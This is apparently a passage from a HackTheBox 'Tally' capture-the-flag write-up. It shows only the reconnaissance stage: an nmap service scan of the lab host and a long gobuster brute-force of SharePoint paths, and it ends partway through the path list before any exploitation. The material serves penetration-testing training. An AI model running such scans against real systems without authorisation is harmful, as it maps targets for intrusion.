---
layout: post
title: HackTheBox - Tally Writeup
tags: [hackthebox]
---

Tally is enumeration galore, full of red herrings, distractions, and rabbit holes. I spent hours digging through files and directories on this one. Tally will test your patience but it felt like a very realistic box so I enjoyed it. An interesting exploit at the end as well. Let's get started!

![tally](/img/tally.png)

## Enumeration

As always an nmap scan to get us going.

```
root@kali:~/htb/tally# nmap -A 10.10.10.59

Starting Nmap 7.50 ( https://nmap.org ) 
Nmap scan report for 10.10.10.59
Host is up (0.048s latency).
Not shown: 992 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-generator: Microsoft SharePoint
|_http-server-header: Microsoft-IIS/10.0
| http-title: Home
|_Requested resource was http://10.10.10.59/_layouts/15/start.aspx#/default.aspx
81/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
808/tcp  open  ccproxy-http?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2016 13.00.1601.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: TALLY
|   NetBIOS_Domain_Name: TALLY
|   NetBIOS_Computer_Name: TALLY
|   DNS_Domain_Name: TALLY
|   DNS_Computer_Name: TALLY
|_  Product_Version: 10.0.14393
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2018-01-26T13:06:37
|_Not valid after:  2048-01-26T13:06:37
|_ssl-date: 2018-01-26T19:08:45+00:00; +7s from scanner time.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.50%E=4%D=1/26%OT=21%CT=1%CU=44020%PV=Y%DS=2%DC=T%G=Y%TM=5A6B7CC
OS:6%P=i686-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=O%TS=A)
OS:SEQ(SP=101%GCD=1%ISR=10A%TI=RD%CI=I%II=I%TS=8)SEQ(SP=101%GCD=1%ISR=10A%T
OS:I=I%CI=I%TS=A)SEQ(SP=101%GCD=1%ISR=10A%TI=I%TS=A)OPS(O1=M54DNW8ST11%O2=M
OS:54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11)WIN
OS:(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=200
OS:0%O=M54DNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=
OS:Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%
OS:RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7
OS:(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=
OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6s, deviation: 0s, median: 6s
| ms-sql-info: 
|   10.10.10.59:1433: 
|     Version: 
|       name: Microsoft SQL Server 2016 RTM
|       number: 13.00.1601.00
|       Product: Microsoft SQL Server 2016
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol

```

So we have a few interesting services to take a look at, including a SharePoint site. Lucky for us seclists has a wordlist specifically for SharePoint. Let's fire up gobuster and see what we get.

```
root@kali:~/htb/tally# gobuster -w /usr/share/seclists/Discovery/Web_Content/sharepoint.txt -u http://10.10.10.59/

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.59/
[+] Threads      : 10
[+] Wordlist     : /usr/share/seclists/Discovery/Web_Content/sharepoint.txt
[+] Status codes : 302,307,200,204,301
=====================================================
/_app_bin (Status: 301)
/_layouts (Status: 301)
/_layouts/1033 (Status: 301)
/_controltemplates (Status: 301)
/_layouts/1033/avreport.htm (Status: 200)
/_layouts/1033/filedlg.htm (Status: 200)
/_layouts/1033/error.htm (Status: 200)
/_layouts/1033/fontdlg.htm (Status: 200)
/_layouts/1033/iframe.htm (Status: 200)
/_layouts/1033/images (Status: 301)
/_layouts/1033/instable.htm (Status: 200)
/_layouts/1033/menu.htc (Status: 200)
/_layouts/1033/menubar.htc (Status: 200)
/_layouts/1033/selcolor.htm (Status: 200)
/_layouts/1033/spthemes.xsd (Status: 200)
/_layouts/1033/spthemes.xml (Status: 200)
/_catalogs/lt/forms/allitems.aspx (Status: 200)
/_catalogs/wp/forms/allitems.aspx (Status: 200)
/_catalogs/masterpage/forms/allitems.aspx (Status: 200)
/_layouts/addcontenttypetolist.aspx (Status: 302)
/_layouts/accessdenied.aspx (Status: 302)
/_layouts/addfieldfromtemplate.aspx (Status: 302)
/_layouts/aclinv.aspx (Status: 302)
/_layouts/addrole.aspx (Status: 302)
/_layouts/addwrkfl.aspx (Status: 302)
/_layouts/adminrecyclebin.aspx (Status: 302)
/_layouts/advsetng.aspx (Status: 302)
/_layouts/approve.aspx (Status: 302)
/_layouts/aspxform.aspx (Status: 302)
/_layouts/assetedithyperlink.aspx (Status: 200)
/_layouts/assetimagepicker.aspx (Status: 200)
/_layouts/addservernamemappings.aspx (Status: 200)
/_layouts/addnavigationlinkdialog.aspx (Status: 200)
/_layouts/addfiletype.aspx (Status: 200)
/_layouts/areacachesettings.aspx (Status: 200)
/_layouts/addcontentsource.aspx (Status: 200)
/_layouts/areawelcomepage.aspx (Status: 200)
/_layouts/areanavigationsettings.aspx (Status: 200)
/_layouts/areatemplatesettings.aspx (Status: 200)
/_layouts/associatedgroups.aspx (Status: 302)
/_layouts/assocwrkfl.aspx (Status: 302)
/_layouts/audience_view.aspx (Status: 200)
/_layouts/auditsettings.aspx (Status: 200)
/_layouts/audience_list.aspx (Status: 200)
/_layouts/assetportalbrowser.aspx (Status: 200)
/_layouts/assetuploader.aspx (Status: 200)
/_layouts/audience_edit.aspx (Status: 200)
/_layouts/audience_memberlist.aspx (Status: 200)
/_layouts/audience_sched.aspx (Status: 200)
/_layouts/audience_main.aspx (Status: 200)
/_layouts/audience_defruleedit.aspx (Status: 200)
/_layouts/authenticate.aspx (Status: 302)
/_layouts/backlinks.aspx (Status: 302)
/_layouts/avreport.aspx (Status: 302)
/_layouts/bdcadminui/bdcentities.aspx (Status: 200)
/_layouts/bdcadminui/bdcapplications.aspx (Status: 200)
/_layouts/bdcadminui/viewbdcentity.aspx (Status: 200)
/_layouts/barcodeimagefromitem.aspx (Status: 200)
/_layouts/bdcadminui/managepermissions.aspx (Status: 200)
/_layouts/bdcadminui/exportbdcapplication.aspx (Status: 200)
/_layouts/bdcadminui/addbdcapplication.aspx (Status: 200)
/_layouts/bdcadminui/editbdcaction.aspx (Status: 200)
/_layouts/bdcadminui/viewbdcapplication.aspx (Status: 200)
/_layouts/bdcadminui/addbdcaction.aspx (Status: 200)
/_layouts/bestbet.aspx (Status: 302)
/_layouts/changecontenttypeorder.aspx (Status: 302)
/_layouts/businessdatasynchronizer.aspx (Status: 302)
/_layouts/changefieldorder.aspx (Status: 302)
/_layouts/changecontenttypeoptionalsettings.aspx (Status: 302)
/_layouts/bpcf.aspx (Status: 302)
/_layouts/category.aspx (Status: 302)
/_layouts/checkin.aspx (Status: 302)
/_layouts/confirmation.aspx (Status: 302)
/_layouts/conngps.aspx (Status: 302)
/_layouts/bulkwrktaskhandler.aspx (Status: 200)
/_layouts/bulkwrktaskip.aspx (Status: 200)
/_layouts/changesitemasterpage.aspx (Status: 200)
/_layouts/cmsslwpaddeditgroup.aspx (Status: 200)
/_layouts/cmsslwpeditview.aspx (Status: 200)
/_layouts/containerpicker.aspx (Status: 302)
/_layouts/cmsslwpsortlinks.aspx (Status: 200)
/_layouts/cmsslwpaddeditlink.aspx (Status: 200)
/_layouts/contenttypeconvertersettings.aspx (Status: 200)
/_layouts/contentaccessaccount.aspx (Status: 200)
/_layouts/copyrole.aspx (Status: 302)
/_layouts/copyresults.aspx (Status: 302)
/_layouts/copy.aspx (Status: 302)
/_layouts/copyutil.aspx (Status: 302)
/_layouts/convertersettings.aspx (Status: 200)
/_layouts/crawledproperty.aspx (Status: 302)
/_layouts/createwebpage.aspx (Status: 302)
/_layouts/ctypedit.aspx (Status: 302)
/_layouts/create.aspx (Status: 302)
/_layouts/createws.aspx (Status: 302)
/_layouts/createadaccount.aspx (Status: 302)
/_layouts/ctypenew.aspx (Status: 302)
/_layouts/deactivatefeature.aspx (Status: 302)
/_layouts/deleteweb.aspx (Status: 302)
/_layouts/dladvopt.aspx (Status: 302)
/_layouts/discbar.aspx (Status: 302)
/_layouts/deletemu.aspx (Status: 302)
/_layouts/ctdmsettings.aspx (Status: 200)
/_layouts/createpage.aspx (Status: 200)
/_layouts/customizereport.aspx (Status: 200)
/_layouts/cstwrkflip.aspx (Status: 200)
/_layouts/dmplaceholder.aspx (Status: 200)
/_layouts/createworkbook.aspx (Status: 200)
/_layouts/download.aspx (Status: 302)
/_layouts/doctrans.aspx (Status: 302)
/_layouts/dws.aspx (Status: 302)
/_layouts/editnav.aspx (Status: 302)
/_layouts/editgrp.aspx (Status: 302)
/_layouts/editprms.aspx (Status: 302)
/_layouts/editcopyinformation.aspx (Status: 302)
/_layouts/dynamicimageprovider.aspx (Status: 200)
/_layouts/editcrawlrule.aspx (Status: 200)
/_layouts/editdsserver.aspx (Status: 200)
/_layouts/editpolicy.aspx (Status: 200)
/_layouts/editcontentsource.aspx (Status: 200)
/_layouts/editprofile.aspx (Status: 200)
/_layouts/editpropertynames.aspx (Status: 200)
/_layouts/editpropertynames2.aspx (Status: 200)
/_layouts/editrelevancesettings.aspx (Status: 200)
/_layouts/editrole.aspx (Status: 302)
/_layouts/emaildetails.aspx (Status: 302)
/_layouts/editview.aspx (Status: 302)
/_layouts/emailsettings.aspx (Status: 302)
/_layouts/enhancedsearch.aspx (Status: 302)
/_layouts/error.aspx (Status: 302)
/_layouts/editproperty.aspx (Status: 200)
/_layouts/editschedule.aspx (Status: 200)
/_layouts/editsection.aspx (Status: 200)
/_layouts/enablealerts.aspx (Status: 200)
/_layouts/ewrcustomfilter.aspx (Status: 200)
/_layouts/ewrtop10.aspx (Status: 200)
/_layouts/ewrfind.aspx (Status: 200)
/_layouts/excelcellpicker.aspx (Status: 200)
/_layouts/excelprofilepage.aspx (Status: 200)
/_layouts/excelserversafedataprovider.aspx (Status: 200)
/_layouts/ewrpredialog.aspx (Status: 200)
/_layouts/ewrfilter.aspx (Status: 200)
/_layouts/excelrenderer.aspx (Status: 200)
/_layouts/excelserversafedataproviders.aspx (Status: 200)
/_layouts/excelserversettings.aspx (Status: 200)
/_layouts/excelservertrusteddcls.aspx (Status: 200)
/_layouts/excelservertrustedlocations.aspx (Status: 200)
/_layouts/excelservertrustedlocation.aspx (Status: 200)
/_layouts/excelservertrusteddcl.aspx (Status: 200)
/_layouts/excelserveruserdefinedfunction.aspx (Status: 200)
/_layouts/filter.aspx (Status: 302)
/_layouts/exemptpolicy.aspx (Status: 200)
/_layouts/excelserveruserdefinedfunctions.aspx (Status: 200)
/_layouts/feed.aspx (Status: 200)
/_layouts/exportpolicy.aspx (Status: 200)
/_layouts/formedt.aspx (Status: 302)
/_layouts/fldedit.aspx (Status: 302)
/_layouts/filtervaluespickerdialog.aspx (Status: 302)
/_layouts/fldpick.aspx (Status: 302)
/_layouts/fldeditex.aspx (Status: 302)
/_layouts/fldnewex.aspx (Status: 302)
/_layouts/fldnew.aspx (Status: 302)
/_layouts/formserver.aspx (Status: 200)
/_layouts/gear.aspx (Status: 302)
/_layouts/genericpicker.aspx (Status: 302)
/_layouts/groups.aspx (Status: 302)
/_layouts/help.aspx (Status: 302)
/_layouts/helpcontent.aspx (Status: 302)
/_layouts/formresource.aspx (Status: 200)
/_layouts/formserverattachments.aspx (Status: 200)
/_layouts/folders.aspx (Status: 200)
/_layouts/getdataconnectionfile.aspx (Status: 200)
/_layouts/formserverdetector.aspx (Status: 200)
/_layouts/getsspscopes.aspx (Status: 200)
/_layouts/getsspstatus.aspx (Status: 200)
/_layouts/getssploginfo.aspx (Status: 200)
/_layouts/helpsearch.aspx (Status: 302)
/_layouts/htmltranslate.aspx (Status: 302)
/_layouts/htmltrredir.aspx (Status: 302)
/_layouts/iframe.aspx (Status: 302)
/_layouts/htmledit.aspx (Status: 302)
/_layouts/htmltrverify.aspx (Status: 302)
/_layouts/infopage.aspx (Status: 302)
/_layouts/itemrwfassoc.aspx (Status: 302)
/_layouts/irm.aspx (Status: 302)
/_layouts/importpolicy.aspx (Status: 200)
/_layouts/iniwrkflip.aspx (Status: 200)
/_layouts/holdreport.aspx (Status: 200)
/_layouts/indxcol.aspx (Status: 302)
/_layouts/irmrept.aspx (Status: 302)
/_layouts/hold.aspx (Status: 200)
/_layouts/iviewhost.aspx (Status: 200)
/_layouts/keyword.aspx (Status: 302)
/_layouts/listfeed.aspx (Status: 302)
/_layouts/listedit.aspx (Status: 302)
/_layouts/listkeywords.aspx (Status: 302)
/_layouts/listgeneralsettings.aspx (Status: 302)
/_layouts/labelimage.aspx (Status: 200)
/_layouts/listenabletargeting.aspx (Status: 200)
/_layouts/linkschecker.aspx (Status: 200)
/_layouts/listcontentsources.aspx (Status: 200)
/_layouts/listsyndication.aspx (Status: 302)
/_layouts/login.aspx (Status: 302)
/_layouts/linkscheckerwiz.aspx (Status: 200)
/_layouts/lstsetng.aspx (Status: 302)
/_layouts/managecheckedoutfiles.aspx (Status: 302)
/_layouts/managecontenttype.aspx (Status: 302)
/_layouts/managecontenttypefield.aspx (Status: 302)
/_layouts/managefeatures.aspx (Status: 302)
/_layouts/managecopies.aspx (Status: 302)
/_layouts/managedproperty.aspx (Status: 302)
/_layouts/logviewer.aspx (Status: 200)
/_layouts/logsummary.aspx (Status: 200)
/_layouts/managefeatures.aspx?scope=site (Status: 302)
/_layouts/longrunningoperationprogress.aspx (Status: 200)
/_layouts/listservernamemappings.aspx (Status: 200)
/_layouts/lroperationstatus.aspx (Status: 200)
/_layouts/managecrawlrules.aspx (Status: 200)
/_layouts/managefiletypes.aspx (Status: 200)
/_layouts/matchingrule.aspx (Status: 302)
/_layouts/mcontent.aspx (Status: 302)
/_layouts/mngsiteadmin.aspx (Status: 302)
/_layouts/metaweblog.aspx (Status: 302)
/_layouts/mngfield.aspx (Status: 302)
/_layouts/mngctype.aspx (Status: 302)
/_layouts/mngsubwebs.aspx?view=sites (Status: 302)
/_layouts/mobile/default.aspx (Status: 302)
/_layouts/mngsubwebs.aspx (Status: 302)
/_layouts/mobile/bloghome.aspx (Status: 302)
/_layouts/manageitemscheduling.aspx (Status: 200)
/_layouts/manageprivacypolicy.aspx (Status: 200)
/_layouts/mngdisc.aspx (Status: 200)
/_layouts/manageservicepermissions.aspx (Status: 200)
/_layouts/mgrdsserver.aspx (Status: 200)
/_layouts/mobile/delete.aspx (Status: 302)
/_layouts/mgrproperty.aspx (Status: 200)
/_layouts/mobile/dispform.aspx (Status: 302)
/_layouts/mobile/disppost.aspx (Status: 302)
/_layouts/mobile/editform.aspx (Status: 302)
/_layouts/mobile/mblerror.aspx (Status: 302)
/_layouts/mobile/mbllists.aspx (Status: 302)
/_layouts/mobile/newcomment.aspx (Status: 302)
/_layouts/mobile/mbllogin.aspx (Status: 302)
/_layouts/mobile/mbllogout.aspx (Status: 302)
/_layouts/mobile/newform.aspx (Status: 302)
/_layouts/mobile/newpost.aspx (Status: 302)
/_layouts/mobile/view.aspx (Status: 302)
/_layouts/mobile/viewcomment.aspx (Status: 302)
/_layouts/mobile/mobileformserver.aspx (Status: 200)
/_layouts/modwrkflip.aspx (Status: 200)
/_layouts/myinfo.aspx (Status: 200)
/_layouts/myquicklinks.aspx (Status: 200)
/_layouts/mypage.aspx (Status: 200)
/_layouts/mymemberships.aspx (Status: 200)
/_layouts/mycontactlinks.aspx (Status: 200)
/_layouts/mtgredir.aspx (Status: 302)
/_layouts/mytasks.aspx (Status: 302)
/_layouts/mysubs.aspx (Status: 302)
/_layouts/newdwp.aspx (Status: 302)
/_layouts/newlink.aspx (Status: 302)
/_layouts/navoptions.aspx (Status: 302)
/_layouts/mysiteheader.aspx (Status: 200)
/_layouts/mysite.aspx (Status: 200)
/_layouts/newmws.aspx (Status: 302)
/_layouts/newsbweb.aspx (Status: 302)
/_layouts/newgrp.aspx (Status: 302)
/_layouts/newvariationsite.aspx (Status: 200)
/_layouts/new.aspx (Status: 302)
/_layouts/newnav.aspx (Status: 302)
/_layouts/osssearchresults.aspx (Status: 302)
/_layouts/password.aspx (Status: 302)
/_layouts/people.aspx (Status: 302)
/_layouts/pagesettings.aspx (Status: 200)
/_layouts/objectcachesettings.aspx (Status: 200)
/_layouts/newpagelayout.aspx (Status: 200)
/_layouts/pageversioninfo.aspx (Status: 200)
/_layouts/newtranslationmanagement.aspx (Status: 200)
/_layouts/officialfilesuccess.aspx (Status: 200)
/_layouts/nocrawlsettings.aspx (Status: 200)
/_layouts/officialfilesetup.aspx (Status: 200)
/_layouts/people.aspx?membershipgroupid=0 (Status: 302)
/_layouts/permsetup.aspx (Status: 302)
/_layouts/portal.aspx (Status: 302)
/_layouts/picker.aspx (Status: 302)
/_layouts/portalview.aspx (Status: 302)
/_layouts/personalsites.aspx (Status: 200)
/_layouts/pickertreeview.aspx (Status: 200)
/_layouts/prjsetng.aspx (Status: 302)
/_layouts/profileredirect.aspx (Status: 302)
/_layouts/policyconfig.aspx (Status: 200)
/_layouts/print.formserver.aspx (Status: 200)
/_layouts/policycts.aspx (Status: 200)
/_layouts/policy.aspx (Status: 200)
/_layouts/printloader.formserver.aspx (Status: 200)
/_layouts/postback.formserver.aspx (Status: 200)
/_layouts/profadminedit.aspx (Status: 200)
/_layouts/policylist.aspx (Status: 200)
/_layouts/profmain.aspx (Status: 200)
/_layouts/pickerresult.aspx (Status: 200)
/_layouts/qstnew.aspx (Status: 302)
/_layouts/qstedit.aspx (Status: 302)
/_layouts/qlreord.aspx (Status: 302)
/_layouts/publishback.aspx (Status: 302)
/_layouts/proxy.aspx (Status: 200)
/_layouts/profmngr.aspx (Status: 200)
/_layouts/quicklinksdialogform.aspx (Status: 200)
/_layouts/profnew.aspx (Status: 200)
/_layouts/quicklinksdialog.aspx (Status: 200)
/_layouts/quicklinksdialog2.aspx (Status: 200)
/_layouts/quicklinks.aspx (Status: 200)
/_layouts/quiklnch.aspx (Status: 302)
/_layouts/redirect.aspx (Status: 302)
/_layouts/recyclebin.aspx (Status: 302)
/_layouts/rcxform.aspx (Status: 302)
/_layouts/regionalsetng.aspx (Status: 302)
/_layouts/remwrkfl.aspx (Status: 302)
/_layouts/reghost.aspx (Status: 302)
/_layouts/reorder.aspx (Status: 302)
/_layouts/reqfeatures.aspx (Status: 302)
/_layouts/reqacc.aspx (Status: 302)
/_layouts/reqgroup.aspx (Status: 302)
/_layouts/redirectpage.aspx?target={sitecollectionurl}_catalogs/masterpage (Status: 200)
/_layouts/rellinksscopesettings.aspx (Status: 200)
/_layouts/reqgroupconfirm.aspx (Status: 302)
/_layouts/releasehold.aspx (Status: 200)
/_layouts/renderudc.aspx (Status: 200)
/_layouts/reporting.aspx (Status: 200)
/_layouts/redirectpage.aspx (Status: 200)
/_layouts/rfcxform.aspx (Status: 302)
/_layouts/rfpxform.aspx (Status: 302)
/_layouts/rssxslt.aspx (Status: 302)
/_layouts/role.aspx (Status: 302)
/_layouts/savetmpl.aspx (Status: 302)
/_layouts/rtedialog.aspx (Status: 302)
/_layouts/scope.aspx (Status: 302)
/_layouts/scopedisplaygroup.aspx (Status: 302)
/_layouts/scsignup.aspx (Status: 302)
/_layouts/reusabletextpicker.aspx (Status: 200)
/_layouts/resolverecipient.aspx (Status: 200)
/_layouts/rte2ecell.aspx (Status: 200)
/_layouts/rte2etable.aspx (Status: 200)
/_layouts/rte2pueditor.aspx (Status: 200)
/_layouts/rte2erowcolsize.aspx (Status: 200)
/_layouts/schema.aspx (Status: 200)
/_layouts/runreport.aspx (Status: 200)
/_layouts/selectmanagedproperty.aspx (Status: 302)
/_layouts/searchresults.aspx (Status: 302)
/_layouts/selectcrawledproperty.aspx (Status: 302)
/_layouts/setanon.aspx (Status: 302)
/_layouts/searchandaddtohold.aspx (Status: 200)
/_layouts/setrqacc.aspx (Status: 302)
/_layouts/settings.aspx (Status: 302)
/_layouts/searchreset.aspx (Status: 200)
/_layouts/searchresultremoval.aspx (Status: 200)
/_layouts/searchsspsettings.aspx (Status: 200)
/_layouts/selectuser.aspx (Status: 200)
/_layouts/selectpicture2.aspx (Status: 200)
/_layouts/selectpicture.aspx (Status: 200)
/_layouts/signout.aspx (Status: 302)
/_layouts/sitemanager.aspx (Status: 200)
/_layouts/signaturedetailspngloader.formserver.aspx (Status: 200)
/_layouts/signature.formserver.aspx (Status: 200)
/_layouts/signaturedetailsloader.formserver.aspx (Status: 200)
/_layouts/signatureeula.formserver.aspx (Status: 200)
/_layouts/setimport.aspx (Status: 200)
/_layouts/sitecachesettings.aspx (Status: 200)
/_layouts/signaturedetails.formserver.aspx (Status: 200)
/_layouts/sitedirectorysettings.aspx (Status: 200)
/_layouts/spcontnt.aspx (Status: 302)
/_layouts/siterss.aspx (Status: 302)
/_layouts/spcf.aspx (Status: 302)
/_layouts/sitesubs.aspx (Status: 302)
/_layouts/smtcommentsdialog.aspx (Status: 200)
/_layouts/sitemanager.aspx?lro=all (Status: 200)
/_layouts/spellchecker.aspx (Status: 200)
/_layouts/sledit.aspx (Status: 200)
/_layouts/spusagesite.aspx (Status: 200)
/_layouts/slnew.aspx (Status: 200)
/_layouts/spnewdashboard.aspx (Status: 200)
/_layouts/spusagesiteclickthroughs.aspx (Status: 200)
/_layouts/spusageconfig.aspx (Status: 200)
/_layouts/spsredirect.aspx (Status: 200)
/_layouts/spusagesitetoppages.aspx (Status: 200)
/_layouts/spusagesspsearchresults.aspx (Status: 200)
/_layouts/spusagesiteusers.aspx (Status: 200)
/_layouts/spusagesitesearchqueries.aspx (Status: 200)
/_layouts/spusagewebclickthroughs.aspx (Status: 200)
/_layouts/spusagesitesearchresults.aspx (Status: 200)
/_layouts/spusagesitehomepage.aspx (Status: 200)
/_layouts/spusageweb.aspx (Status: 200)
/_layouts/spusagesitereferrers.aspx (Status: 200)
/_layouts/spusagesspsearchqueries.aspx (Status: 200)
/_layouts/srchrss.aspx (Status: 302)
/_layouts/srchvis.aspx (Status: 302)
/_layouts/storman.aspx (Status: 302)
/_layouts/subedit.aspx (Status: 302)
/_layouts/subchoos.aspx (Status: 302)
/_layouts/subnew.aspx (Status: 302)
/_layouts/submitrepair.aspx (Status: 302)
/_layouts/survedit.aspx (Status: 302)
/_layouts/templatepick.aspx (Status: 302)
/_layouts/success.aspx (Status: 302)
/_layouts/themeweb.aspx (Status: 302)
/_layouts/tnreord.aspx (Status: 302)
/_layouts/topnav.aspx (Status: 302)
/_layouts/toolpane.aspx (Status: 302)
/_layouts/updatecopies.aspx (Status: 302)
/_layouts/upload.aspx (Status: 302)
/_layouts/usagedetails.aspx (Status: 302)
/_layouts/usage.aspx (Status: 302)
/_layouts/useconfirmation.aspx (Status: 302)
/_layouts/user.aspx (Status: 302)
/_layouts/userdisp.aspx?id=1 (Status: 302)
/_layouts/userdisp.aspx (Status: 302)
/_layouts/useredit.aspx (Status: 302)
/_layouts/useredit.aspx?id=1&source=%2f%5flayouts%2fpeople%2easpx (Status: 302)
/_layouts/spusagewebhomepage.aspx (Status: 200)
/_layouts/translatablesettings.aspx (Status: 200)
/_layouts/spusagewebtoppages.aspx (Status: 200)
/_layouts/ssologon.aspx (Status: 200)
/_layouts/spusagewebreferrers.aspx (Status: 200)
/_layouts/unapprovedresources.aspx (Status: 200)
/_layouts/spusagewebusers.aspx (Status: 200)
/_layouts/updateschedule.aspx (Status: 200)
/_layouts/variationlabel.aspx (Status: 200)
/_layouts/variationexport.aspx (Status: 200)
/_layouts/viewedit.aspx (Status: 302)
/_layouts/viewgrouppermissions.aspx (Status: 302)
/_layouts/versions.aspx (Status: 302)
/_layouts/versiondiff.aspx (Status: 302)
/_layouts/viewnew.aspx (Status: 302)
/_layouts/viewlsts.aspx (Status: 302)
/_layouts/webpartgallerypickerpage.aspx (Status: 302)
/_layouts/viewtype.aspx (Status: 302)
/_layouts/vsubwebs.aspx (Status: 302)
/_layouts/viewscopesettings.aspx (Status: 302)
/_layouts/viewscopes.aspx (Status: 302)
/_layouts/webdeleted.aspx (Status: 302)
/_layouts/wpprevw.aspx (Status: 302)
/_layouts/workspce.aspx (Status: 302)
/_layouts/workflow.aspx (Status: 302)
/_layouts/wpeula.aspx (Status: 302)
/_layouts/wpprevw.aspx?id=247 (Status: 302)
/_layouts/wrksetng.aspx (Status: 302)
/_layouts/wrkstat.aspx (Status: 302)
/_layouts/zoombldr.aspx (Status: 302)
/_layouts/variationsettings.aspx (Status: 200)
/_layouts/variations/variationimport.aspx (Status: 200)
/_layouts/variationlogs.aspx (Status: 200)
/_layouts/wrktaskip.aspx (Status: 200)
/_layouts/xlviewer.aspx (Status: 200)
/_vti_adm/admin.asmx (Status: 200)
/_layouts/wsrpmarkupproxy.aspx (Status: 200)
/_vti_bin (Status: 301)
/_layouts/xlatewfassoc.aspx (Status: 200)
/_layouts/variationlabels.aspx (Status: 200)
/_vti_bin/_vti_aut/author.dll (Status: 200)
/_vti_bin/_vti_adm/admin.dll (Status: 200)
/_vti_bin/alertsdisco.aspx (Status: 200)
/_vti_bin/alerts.asmx (Status: 200)
/_vti_bin/authentication.asmx (Status: 200)
/_vti_bin/alertswsdl.aspx (Status: 200)
/_vti_bin/copy.asmx (Status: 200)
/_vti_bin/dspstswsdl.aspx (Status: 200)
/_vti_bin/dwswsdl.aspx (Status: 200)
/_vti_bin/dws.asmx (Status: 200)
/_vti_bin/dwsdisco.aspx (Status: 200)
/_vti_bin/dspstsdisco.aspx (Status: 200)
/_vti_bin/dspsts.asmx (Status: 200)
/_vti_bin/lists.asmx (Status: 200)
/_vti_bin/formsdisco.aspx (Status: 200)
/_vti_bin/forms.asmx (Status: 200)
/_vti_bin/formswsdl.aspx (Status: 200)
/_vti_bin/imagingwsdl.aspx (Status: 200)
/_vti_bin/imaging.asmx (Status: 200)
/_vti_bin/imagingdisco.aspx (Status: 200)
/_vti_bin/listsdisco.aspx (Status: 200)
/_vti_bin/microsoft.sharepoint.xml (Status: 200)
/_vti_bin/listswsdl.aspx (Status: 200)
/_vti_bin/meetingsdisco.aspx (Status: 200)
/_vti_bin/meetings.asmx (Status: 200)
/_vti_bin/people.asmx (Status: 200)
/_vti_bin/meetingswsdl.aspx (Status: 200)
/_vti_bin/permissionsdisco.aspx (Status: 200)
/_vti_bin/permissions.asmx (Status: 200)
/_vti_bin/permissionswsdl.aspx (Status: 200)
/_vti_bin/exportwp.aspx (Status: 302)
/_vti_bin/expurlwp.aspx (Status: 302)
/_vti_bin/searchdisco.aspx (Status: 200)
/_vti_bin/shtml.dll (Status: 200)
/_vti_bin/search.asmx (Status: 200)
/_vti_bin/searchwsdl.aspx (Status: 200)
/_vti_bin/publishedlinksservice.asmx (Status: 200)
/_vti_bin/sites.asmx (Status: 200)
/_vti_bin/sitedatawsdl.aspx (Status: 200)
/_vti_bin/sitedata.asmx (Status: 200)
/_vti_bin/sharepointemailws.asmx (Status: 200)
/_vti_bin/sitedatadisco.aspx (Status: 200)
/_vti_bin/siteswsdl.aspx (Status: 200)
/_vti_bin/spdisco.aspx (Status: 200)
/_vti_bin/sitesdisco.aspx (Status: 200)
/_vti_bin/usergroupwsdl.aspx (Status: 200)
/_vti_bin/usergroupdisco.aspx (Status: 200)
/_vti_bin/usergroup.asmx (Status: 200)
/_vti_bin/versions.asmx (Status: 200)
/_vti_bin/spsearch.asmx (Status: 200)
/_vti_bin/webpartpages.asmx (Status: 200)
/_vti_bin/versionswsdl.aspx (Status: 200)
/_vti_bin/views.asmx (Status: 200)
/_vti_bin/versionsdisco.aspx (Status: 200)
/_vti_bin/viewswsdl.aspx (Status: 200)
/_vti_inf.html (Status: 200)
/_vti_pvt (Status: 301)
/_wpresources (Status: 301)
/_vti_bin/viewsdisco.aspx (Status: 200)
/_vti_bin/webs.asmx (Status: 200)
/_vti_bin/webpartpagesdisco.aspx (Status: 200)
/alerts.asmx (Status: 200)
/app_browsers (Status: 301)
/app_globalresources (Status: 301)
/_vti_bin/webswsdl.aspx (Status: 200)
/areaservice.asmx (Status: 200)
/aspnet_client (Status: 301)
/_vti_bin/webpartpageswsdl.aspx (Status: 200)
/_vti_bin/websdisco.aspx (Status: 200)
/bin (Status: 301)
/docs/_layouts/viewlsts.aspx (Status: 302)
/default.aspx (Status: 200)
/dws.asmx (Status: 200)
/dspsts.asmx (Status: 200)
/forms.asmx (Status: 200)
/imaging.asmx (Status: 200)
